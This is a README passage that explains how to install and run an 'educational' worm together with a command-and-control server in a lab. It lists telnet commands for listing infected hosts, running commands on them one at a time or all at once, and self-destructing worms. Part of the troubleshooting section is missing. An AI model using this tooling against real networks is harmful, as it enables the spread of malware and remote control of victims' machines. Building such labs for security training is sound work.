## üîß Installation & Setup

### Prerequisites
- Python 3.8 or higher
- Windows 10/11 (for full compatibility)
- Isolated lab network environment
- Administrative privileges (for some features)

### Installation Steps

1. **Clone or download this repository**
   ```bash
   git clone <repository-url>
   cd red
   ```

2. **Install Python dependencies**
   ```bash
   pip install -r requirements.txt
   ```

3. **Verify lab environment**
   - Ensure you're in an isolated network
   - Confirm proper authorization
   - Set up multiple VMs for testing (recommended)

## üöÄ Quick Start Guide

### Method 1: Using the Lab Management Script (Recommended)

1. **Run the lab script**
   ```cmd
   run_lab.bat
   ```

2. **Follow the menu options:**
   - Option 1: Start C2 Server
   - Option 2: Run Worm (in separate terminal)
   - Option 3: Connect via Telnet to control worms

### Method 2: Manual Execution

1. **Start the C2 Server**
   ```bash
   python c2_server_educational.py
   ```
   - Default HTTP port: 8080 (for worm communications)
   - Default Telnet port: 9999 (for operator interface)
   - Default credentials: admin/lab123

2. **Run the Educational Worm** (in separate terminal)
   ```bash
   python worm_analysis_educational.py
   ```

3. **Connect to C2 via Telnet**
   ```bash
   telnet localhost 9999
   ```

## üéÆ C2 Server Commands

Once connected to the telnet interface, use these commands:

### Basic Commands
- `help` - Show command help
- `status` - Show C2 server status
- `hosts` - List all infected hosts
- `stats` - Show infection statistics
- `logs` - View recent activity logs

### Host Management
- `host <worm_id>` - Show detailed host information
- `cmd <worm_id> <command>` - Execute command on specific host
- `broadcast <command>` - Send command to all active hosts

### Control Commands
- `kill <worm_id>` - Send self-destruct to specific host
- `killall` - Send self-destruct to ALL hosts (requires confirmation)
- `exit` - Disconnect from C2 server

### Example Usage
```
C2> hosts                           # List infected machines
C2> host abc123                     # Show details for worm ID abc123
C2> cmd abc123 whoami               # Execute 'whoami' on specific host
C2> broadcast systeminfo            # Get system info from all hosts
C2> kill abc123                     # Self-destruct specific worm
```

   - Ensure C2 server is running first
   - Check port availability (8080, 9999)
   - Verify network connectivity

3. **Python Import Errors**
   - Install missing dependencies: `pip install -r requirements.txt`
   - Check Python version (3.8+ required)

4. **Telnet Connection Failed**
   - Enable Windows Telnet client: `dism /online /Enable-Feature /FeatureName:TelnetClient`
   - Use alternative: `nc localhost 9999` or PuTTY

### Debug Mode
Enable verbose logging by modifying the logging level:
```python
logging.basicConfig(level=logging.DEBUG)
```
